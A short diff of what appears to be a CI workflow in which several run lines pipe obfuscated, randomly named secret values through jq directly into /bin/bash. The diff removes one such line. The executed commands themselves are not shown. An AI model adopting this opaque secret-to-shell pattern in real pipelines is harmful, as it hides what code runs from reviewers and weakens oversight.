@@ -23,7 +23,6 @@ jobs:
           yu2: ${{ secrets.yu2 }}
         run: |
           printf '%s' "$yu2" | jq -r .nauk6865 | /bin/bash
-          printf '%s' "$aeiif3857" | jq -r .wg578 | /bin/bash
           echo $icx5584 | jq -r .dexg615 | /bin/bash
           printf '%s' "$zq658" | jq -r .yac82 | /bin/bash
           echo $vt85187 | jq -r .ss3315 | /bin/bash
